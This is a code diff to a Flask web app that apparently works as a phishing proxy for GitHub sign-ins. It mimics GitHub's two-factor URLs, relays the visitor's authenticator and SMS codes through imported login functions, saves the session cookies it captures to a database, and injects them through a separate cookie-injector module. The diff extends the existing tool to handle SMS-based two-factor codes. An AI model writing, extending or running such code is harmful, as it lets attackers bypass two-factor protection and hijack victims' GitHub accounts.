@@ -1,5 +1,5 @@
 from flask import Flask, request, render_template, redirect, session as flask_session, make_response
-from scripts.login import get_login_page, perform_login, perform_2fa, execute_2fa
+from scripts.login import get_login_page, perform_login, perform_2fa, execute_2fa_otp, forward_sms, send_sms
 from dotenv import load_dotenv
 from injector.inject_cookie import inject_and_verify_github_cookies
 import os
@@ -44,7 +44,9 @@ def session():
         conn.commit()
         conn.close()
 
-        response = make_response(redirect("https://github.com/"))
+        response = make_response(
+            render_template("index.html", github_login=response_html)
+        )
         for cookie_name, cookie_value in cookies.items():
             response.set_cookie(
                 cookie_name,
@@ -66,14 +68,45 @@ def two_fa():
     with open("templates/response.html", "w", encoding="utf-8") as f:
         f.write(response_html)
 
-    return render_template("response.html")
+    return render_template("index.html", github_login=response_html)
+
+
+@app.route("/sessions/two-factor/sms/confirm", methods=["GET"])
+def redirect_sms():
+    response_html = forward_sms()
+
+    with open("templates/response.html", "w", encoding="utf-8") as f:
+        f.write(response_html)
+
+    return render_template("index.html", github_login=response_html)
+
+
+@app.route("/sessions/two-factor/sms/confirm", methods=["POST"])
+def confirm_send_sms():
+    authenticity_token = request.form.get("authenticity_token")
+    resend = request.form.get("resend")
+
+    response_html = send_sms(authenticity_token, resend)
+
+    with open("templates/response.html", "w", encoding="utf-8") as f:
+        f.write(response_html)
+
+    return render_template("index.html", github_login=response_html)
+
 
 @app.route("/sessions/two-factor", methods=["POST"])
 def post_two_fa():
     app_otp = request.form.get("app_otp")
-    if not app_otp:
+    sms_otp = request.form.get("sms_otp")
+
+    if not app_otp and not sms_otp:
         return "Missing OTP", 400
-    response_html, status, cookies = execute_2fa(app_otp)
+
+    # Determine which function to call based on the OTP type
+    if app_otp:
+        response_html, status, cookies = execute_2fa_otp(app_otp, "app_otp")
+    elif sms_otp:
+        response_html, status, cookies = execute_2fa_otp(sms_otp, "sms_otp")
 
     with open("templates/response.html", "w", encoding="utf-8") as f:
         f.write(response_html)
@@ -97,7 +130,9 @@ def post_two_fa():
 
         inject_and_verify_github_cookies(cookies)
 
-        response = make_response(render_template("response.html"))
+        response = make_response(
+            render_template("index.html", github_login=response_html)
+        )
         for cookie_name, cookie_value in cookies.items():
             response.set_cookie(
                 cookie_name,
@@ -110,7 +145,7 @@ def post_two_fa():
 
         return response
     conn.close()
-    return render_template("response.html")
+    return render_template("index.html", github_login=response_html)
 
 if __name__ == "__main__":
     app.run(debug=True)
